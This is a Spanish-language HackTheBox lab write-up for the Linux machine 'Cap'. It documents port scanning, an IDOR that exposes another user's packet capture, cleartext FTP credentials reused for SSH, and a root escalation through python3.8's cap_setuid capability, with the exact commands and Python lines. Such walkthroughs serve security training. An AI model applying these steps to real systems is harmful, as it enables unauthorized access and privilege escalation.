---
icon: linux
---

# Cap

## Resumen

### Detalles

| Campo                 | Detalle       |
| --------------------- | ------------- |
| **Nombre**            | Cap           |
| **Sistema Operativo** | Linux         |
| **Plataforma**        | HackTheBox    |
| **Fecha**             | 05/11/2026    |
| **IP Objetivo**       | 10.129.84.187 |

### Executive Summary

Máquina Linux de dificultad fácil que expone FTP (`vsftpd 3.0.3`), SSH y una aplicación web servida con Gunicorn bajo el título Security Dashboard. La enumeración inicial identificó un panel web con funcionalidad de capturas de seguridad accesibles mediante un identificador numérico.

Se detectó una vulnerabilidad IDOR en el endpoint `/data/<id>`, que permitía descargar archivos `.pcap` de otros usuarios. Se descargó la captura correspondiente al ID 0 y se analizó con Wireshark, donde se observaron credenciales de FTP en texto claro para el usuario `nathan: Buck3tH4TF0RM3!`. Esas credenciales eran reutilizadas en el servicio SSH, lo que permitió la intrusión al sistema y la obtención de la flag de usuario.

Para la escalada de privilegios se comprobó que el usuario nathan no pertenecía al grupo sudo y se enumeraron archivos con capacidades asignadas mediante `getcap -r /`. Se encontró que `/usr/bin/python3.8` tenía la capability `cap_setuid`, lo que permitía cambiar el UID a 0 desde una sesión de Python y ejecutar `/bin/bash` como root, obteniendo así la flag final.

### Técnicas

* IDOR
* Information Leakage
* Credential reuse
* Abusing Capabilities

## Information Gathering

### Port Scanning

#### TCP

```bash
> sudo nmap -sS -p- -Pn -n -vv --min-rate 5000 10.129.84.187
> nmap -sCV -Pn -n -v -p21,22,80 10.129.84.187 -oG allServices
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

| Puerto | Servicio | Versión                                                      |
| ------ | -------- | ------------------------------------------------------------ |
| 21/tcp | ftp      | vsftpd 3.0.3                                                 |
| 22/tcp | ssh      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) |
| 80/tcp | http     | Gunicorn                                                     |

## Explotación

### Foothold

* **Vulnerabilidad:** IDOR + Information Leakage + Credential reuse
* **Exploit:** IDOR en `/data/<id>` para descargar archivo `.pcap` y análisis con WireShark
* **Procedimiento:**

1. Se descarga el archivo `.pcap` del ID 0 en el apartado Security Snapshot

<figure><img src="../../../.gitbook/assets/unknown (26).png" alt="" width="563"><figcaption></figcaption></figure>

2. Análisis con WireShark

<figure><img src="../../../.gitbook/assets/unknown (27).png" alt="" width="563"><figcaption></figcaption></figure>

Se exponen los credenciales del usuario Nathan. `nathan`:`Buck3tH4TF0RM3!`

3. Conexión SSH

```bash
> ssh nathan@10.129.84.187
```

Los credenciales de FTP se reusan en el servicio SSH

* **Evidencia:** (`user.txt`)

![](<../../../.gitbook/assets/unknown (28).png>)

### Privesc

Se comprobó que el usuario nathan no pertenecía al grupo sudo y se procedió a enumerar archivos con capacidades

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

* **Vulnerabilidad:** Abusing Capabilities (Python3.8)
* **Exploit:** Abuso de la capability `cap_setuid` asignada a `/usr/bin/python3.8` mediante `os.setuid(0)` para ejecutar `/bin/bash` como root
* **Procedimiento:**

1. Se inicia una sesión de python3.8 y se asigna el uid 0 (root) con la libreria os

```bash
> python3.8
```

```python
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")
```

```bash
> whoami
root
```

* **Evidencia:** (root.txt)

![](<../../../.gitbook/assets/unknown (29).png>)
